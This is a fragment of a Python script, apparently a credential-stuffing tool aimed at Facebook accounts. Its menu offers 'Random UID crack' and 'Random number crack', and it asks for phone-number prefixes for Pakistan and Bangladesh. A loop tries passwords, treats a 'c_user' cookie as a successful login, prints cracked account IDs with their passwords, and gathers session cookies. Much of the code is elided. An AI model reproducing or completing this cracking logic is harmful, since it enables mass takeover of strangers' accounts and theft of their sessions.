...
def random_crack():
    os.system('clear')
    print(logo)
    print('[A] Random UID crack')
    print('[B] Random number crack')
    print('[C] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='A':
...
def random_number():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example:PK 92301,BD,+88017 .\033[0;97m')
    kode = input('Put code: ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[A A A-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[A A A-CP] '+cid+' | '+ps+'\033[0;97m')
